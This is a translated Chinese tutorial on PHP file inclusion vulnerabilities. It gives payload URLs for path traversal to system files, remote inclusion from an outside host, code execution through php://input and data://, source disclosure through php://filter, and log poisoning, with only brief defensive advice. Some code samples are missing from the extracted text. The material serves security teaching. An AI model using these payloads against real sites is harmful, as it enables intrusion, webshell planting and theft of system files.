# 【技术分享】常见文件包含发生场景与防御
|
##### 译文声明
本文是翻译文章，文章来源：神月资讯
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
****
**前言**
PHP是一种非常流行的Web开发语言，互联网上的许多Web应用都是利用PHP开发的。而在利用PHP开发的Web应用中，PHP文件包含漏洞是一种常见的漏洞。利用PHP文件包含漏洞入侵网站也是主流的一种攻击手段。本文对PHP文件包含漏洞的形成、利用技巧及防范进行了详细的分析，希望对大家攻击方法和防御上有帮助。如果内容有错误纰漏，请留言指正哦~
**一、 文件包含概念**
**1、 概念**
"代码注入"的典型代码就是文件包含(File
Inclusion)，我的理解是叫"外部数据流包含"，至于这个外部数据流是什么，可以是文件，也可以是POST数据流的形式。
文件包含可能会出现在JSP,PHP,ASP等语言中。
我们这里主要以PHP为例。
简单的来说，就是我们用一个可控的变量作为文件名并以文件包含的的方式调用了它，漏洞就产生了。以PHP为例文件包含漏洞可以分为RFI(远程文件包含)和LFI（本地文件包含漏洞）两种。而区分他们最简单的方法就是php.ini中是否开启了allow_url_include。如果开启了我们就有可能包含远程文件。
1、本地文件包含LFI(Local File Include)
2、远程文件包含RFI(Remote File Include)（需要php.ini中allow_url_include=on）
**2、 函数**
PHP中四个包含文件的函数：
**1）include():**
当使用该函数包含文件时，只有代码执行到include()函数时才将文件包含进来，发生错误时只给出一个警告，继续向下执行。
**2）include_once():**
功能和include()相同，区别在于当重复调用同一文件时，程序只调用一次。
**3）require():**
1.require()与include()的区别在于require()执行如果发生错误，函数会输出错误信息，并终止脚本的运行。
2.使用require()函数包含文件时，只要程序一执行，立即调用文件，而include()只有程序执行到该函数时才调用。
**4）require_once():**
它的功能与require()相同，区别在于当重复调用同一文件时，程序只调用一次。
区别：
include(),include_once()在包含文件时，即使遇到错误，只生成警告（E_WARNING），下面的代码依然会继续执行；
而require()和require_once()则会报错，生成致命错误（E_COMPILE_ERROR）并停止脚本，直接退出程序。
因此，如果您希望继续执行，并向用户输出结果，即使包含文件已丢失，那么使用 include。否则，在框架、CMS 或者复杂的 PHP
应用程序编程中，请始终使用 require 向执行流引用关键文件。这有助于在某个关键文件意外丢失的情况下，提高应用程序的安全性和完整性。
参考：
W3School PHP include文件：
文件包含漏洞总结：
**二、 主要包含形式**
**1、包含本地文件**
页面后端php文件"main.php"测试代码：
payload：
    http://www.aaa.com/include/main.php?page=C:\oneword
    www.aaa.com/file.php?file=C:\boot.ini（Windows查看系统版本）
    www.aaa.com/file.php?file=C:\WindowsSystem32inetsrvMetaBase.xml（Windows查看IIS配置文件）
（绝对路径）
    http://www.aaa.com/include/main.php?page=../../oneword
    www.aaa.com/main.php?page=../../../../../etc/passwd
    www.aaa.com/main.php?page=../../../../../proc/self/environ
（相对路径）
**2、包含远程文件**
payload：
    http://www.aaa.com/include/url.php?url=http://www.bbb.com/2.txt
    http://www.aaa.com/include/url.php?url=[http|https|ftp]://www.bbb.com/2.txt（可以有三种，http、https、ftp）
参考：
Exploiting PHP File Inclusion –
Overview：
**三、 文件包含技巧**
**1、包含上传文件**
这个很好理解，也是最简单的一种办法。如果用户上传的文件内容中包含PHP代码，那么这些代码被文件包含函数加载后将会被执行。但能否攻击成功，取决于上传功能的设计，比如需要知道上传文件存放的物理路径，还需要上传的文件有执行权限。
防御：
1）做好上传限制
2）隐藏文件路径
3）设置文件访问、执行权限
**2、伪协议**
**1) php://input**
说明：
用来接收POST数据。我们能够通过input把我们的语句输入上去然后执行。
条件：
php  5.0，只有在allow_url_fopen=On 时才能使用
**用例1 增加一句话：**
URL：
    http://localhost/include/file.php?file=php://input
POST：
    ") ?>
结果将在file.php所在文件下的文件shell.php内增加""一句话。
**用例2 增加文件：**
URL：
    http://localhost/include/file.php?file=php://input
POST：
    ") ?>
这里fopen参数为w，可新建一个文件。
**用例3 执行系统命令：**
URL：
    http://localhost/include/file.php?file=php://input
POST：
**2)data://**
说明：
这是一种数据流封装器，data:URI schema(URL schema可以是很多形式)
利用data://伪协议进行代码执行的思路原理和php://是类似的，都是利用了PHP中的流的概念，将原本的include的文件流重定向到了用户可控制的输入流中
条件：
    allow_url_include=On
    php > 5.2
**用例1 文字命令：**
后台php代码：
Payload：
    http://localhost/file.php?file=data:text/plain,
    http://localhost/file.php?file=data:text/plain;base64,PD9waHAgc3lzdGVtKHdob2FtaSk/Pg==
（使用了base64加密的内容）
用例2 图片命令：
后台php代码：
Payload：
    http://localhost/image.php?imagedata=data://image/jpeg;base64,.....
（后面加上图片木马）
参考：
data://手册：
**3)php://filter**
说明：
这个语句用来查看源码。直接包含php文件时会被解析，不能看到源码，所以用filter来读取，不过要先base64加密传输过来：
?page=php://filter/read=convert.base64-encode/resource=php.ini
访问上述URL后会返回config.php中经过Base64加密后的字符串，解密即可得到源码
解码之后得到：
即为php.ini内容。
Payload：
    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=C:\oneword
（绝对路径）
    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=../../oneword
（相对路径）
    http://localhost/file.php?file=php://filter/read=convert.base64-encode/resource=[http|https|ftp]://www.bbb.com/2.txt
（远程文件）
参考：
《php:// 》:
**3、包含日志文件**
说明：
比如Web服务器的访问日志文件，这是一种通用的技巧。因为几乎所有网站都会将用户的访问记录到访问日志中。因此，攻击者可以向Web日志中插入PHP代码，通过文件包含漏洞来执行包含在Web日志中的PHP代码。下面的案例中就是利用该技巧成功获取到目标网站的WebShell的。但需要注意的是，如果网站访问量大的话，日志文件可能会非常大，这时如果包含一个这么大的文件时，PHP进程可能会卡死。一般网站通常会每天生成一个新的日志文件，因此在凌晨时进行攻击相对来说容易成功。
**1）日志默认路径**
(1) apache+Linux日志默认路径
    /etc/httpd/logs/access_log
或者
    /var/log/httpd/access_log
(2) apache+win2003日志默认路径
    D:xamppapachelogsaccess.log
    D:xamppapachelogserror.log
(3) IIS6.0+win2003默认日志文件